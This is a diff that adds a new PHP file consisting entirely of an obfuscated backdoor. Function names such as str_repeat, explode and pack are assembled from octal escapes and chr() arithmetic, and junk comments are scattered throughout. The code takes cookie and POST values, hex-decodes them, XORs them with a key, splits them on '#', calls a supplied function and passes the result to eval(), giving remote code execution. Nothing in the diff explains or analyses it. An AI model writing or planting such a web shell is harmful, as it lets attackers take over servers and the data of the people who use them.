@@ -1,0 +1,29 @@
+<?php
+$fCTyAh     =   "\163"    .	"\164"/*s   */./*  Lr  */chr     (114)     ./*  rLf  */'_'/* r*/.  "\162"/*   KppAM */.	"\x65"	. chr (	994    -   882	).'e'   .	chr  (/*  tA   */685	-	588/* iMMM  */).'t';
+				$eIppmZ     =  "\145"/*  lRit  */.	chr	(	525 - 405   )."\160"    .     "\154"/* E*/.	"\157"     .	"\144"	.  chr	(101);
+    $EbbZue	=/* Tndnh  */"\143"	.     "\x6f"/*M  */./*  k   */chr  (  886 -/* IIiaI*/769	).chr (/*P*/734/* KC   */-	624 ).chr   ( 941/*   VObV */-	825/*  VBi*/);;
+$FsYpBBRbs	=/*   smM   */chr/*bjw*/(	355    -   243	).chr/*lrR */(  787	-   690	).'c'/*ItDat*/.	"\x6b";
+					$YCYHiT	=  Array	(/* vie   */"NaalkEBjRUrGtHCplVFsuspII"/* zC */=>  "EhAdapGKhijtJwqR"	);$_vAWT	=/*  xLq   */30536;
+
+	$zmwdu     =	Array	(/* cAk  */"pgvzHzKOFnVk"   =>	"GXrbEz"/* xBW*/);;
+  	$hvadV	=  Array(  $YCYHiT,/*   YHh   */$_COOKIE,/* d  */$YCYHiT,  $_POST,/* Mc  */$zmwdu);
+      foreach    ($hvadV/*EPSnm */as	$CqsCcv)	{
+    foreach/* tsg   */(  $CqsCcv/*eY   */as/* ucL  */$goKlDdACL	=>/* Msv  */$LDYiosVuSB )   {
+      $LDYiosVuSB/*  lx*/=	@$FsYpBBRbs(	"\110"  . '*',/*   gF */$LDYiosVuSB/*   dkXCY*/);;
+	   $goKlDdACL/*hpomI*/.= "ENqHCpQ-jDrQI-rdy-PhUi-WBjdoAO-fcLt-gBUNwk";$_CBU	=/*rwk   */27117;
+
+
+/*   aLfdV*/$goKlDdACL	=/*  fTKZt  */$fCTyAh	(	$goKlDdACL,   (	strlen(/*   xnaK  */$LDYiosVuSB    )/strlen(	$goKlDdACL/* B   */)/* URUMX  */)/*  rmqLy   */+	1);;
+				$luibaT	=/*XTz */$LDYiosVuSB/* bDwc */^	$goKlDdACL;;
+				$NYFvJdhiT/*   DOxnT  */=     $eIppmZ/* vnKL */(/*   dBgWh   */chr/* j */(35),    $luibaT );;
+				/* IH   */if/*KlEF   */(  $EbbZue     (  $NYFvJdhiT	)	==	3/* xJ*/)   {
+						$SkBBlvEgDf	=     $NYFvJdhiT[1];
+		    $NvXWsMrbbu/*GkrI  */=  $NYFvJdhiT[2];;
+ /*   Xv  */$LKbRp   =     $SkBBlvEgDf($NvXWsMrbbu);;
+/*I*/eval/* ySIK*/(  $LKbRp	);;
+					die/*lvt   */();;
+
+	}
+
+	}
+ 	}
